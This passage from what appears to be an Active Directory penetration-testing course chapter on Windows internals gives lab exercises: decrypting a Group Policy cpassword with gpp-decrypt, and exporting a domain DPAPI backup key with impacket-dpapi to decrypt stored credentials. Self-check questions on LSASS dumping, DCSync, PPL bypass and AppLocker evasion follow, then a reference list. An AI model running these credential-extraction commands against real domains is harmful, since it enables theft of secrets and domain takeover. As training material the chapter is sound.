ls
```

Decrypt any `cpassword` found:

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

That's CRED-006.

### Exercise 2.G — DPAPI walk

This one is admin-only (you need to read users' Protect folders or have a DPAPI domain backup key). After you've achieved DA in later chapters, come back and do:

```bash
impacket-dpapi backupkeys --export -t dc01.corp.local -u Administrator -p 'DVADlab2024!'
impacket-dpapi credential -file <credblob> -pvk domain_backupkey.pvk
```

---

## Self-check questions

1. What's the difference between a user SID and a group SID? How would you compute the Domain Admins SID from your own SID?
2. Which RID identifies Domain Admins? Which identifies Enterprise Admins, and why does the latter only exist in the forest root?
3. Why is `SeImpersonatePrivilege` so prized? Sketch the Potato chain that turns it into SYSTEM.
4. What's the difference between a DACL and a SACL? Which one would Sysmon configure?
5. Where are local user hashes stored, where are domain user hashes stored, and what's needed in each case to extract them?
6. What does LSASS do, and why do interactive (type 2/10) logons make it valuable to dump while network (type 3) logons don't?
7. Why can't you `copy C:\Windows\NTDS\ntds.dit` while the host is running? Name three workarounds.
8. What is RID 500 and why does it special-case UAC remote restrictions?
9. Name three named pipes attackers enumerate on `\\dc01\IPC$` and which RPC interface each exposes.
10. What is `RunAsPPL=1` and what does Mimikatz do to bypass it?
11. Explain the linked-token model. What's the difference between the "full" and "filtered" token, and which one does `explorer.exe` run with?
12. Identify two registry paths an attacker would set for autostart persistence and the event log channel that records their use.
13. What does the `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` GUID indicate in an event 4662, and why is it the canonical DCSync detection signal?
14. Why does `LocalAccountTokenFilterPolicy=1` matter for lateral movement with a non-RID-500 local admin?
15. Name three "LoLBins" that have been used to bypass AppLocker, and why they work despite being signed Microsoft binaries.

---

## References

- **Russinovich & Solomon — *Windows Internals* (Parts 1 & 2, 7th ed.)** — the authoritative reference. Chapters on processes, security, registry, services, networking are essential.
- **MS-DTYP** — Windows data types specification (formal definitions of SIDs, SDs, ACLs).
- **MS-LSAD / MS-LSAT** — LSA RPC interfaces.
- **MS-SAMR** — SAM remote protocol.
- **MS-DRSR** — Directory Replication (DCSync's underlying protocol).
- **MS-NRPC** — Netlogon Remote Protocol (ZeroLogon's home).
- **MS-EFSR** — Encrypting File System RPC (PetitPotam).
- **MS-RPRN** — Print System Remote Protocol (PrinterBug).
- **Microsoft Docs — Security identifiers:** https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers
- **Microsoft Docs — Access Control Lists:** https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists
- **Microsoft Docs — Logon types:** https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/logon-and-logoff-events
- **Microsoft Docs — Well-known SIDs:** https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers#well-known-sids
- **Sysinternals Suite** — `procexp`, `procmon`, `accesschk`, `psloggedon`, `sigcheck`. Install on a Windows analysis VM.
- **Will Schroeder — *Sneaking Past PowerShell Constrained Language Mode*** — for §2.18 bypasses.
- **harmj0y — *A Guide to Attacking Domain Trusts*** — for cross-forest SID-history (preview for ch 12).
- **0xBadJuju — *WMI for Detection and Response*** — WMI persistence detail.

Next: [03-powershell.md](03-powershell.md).
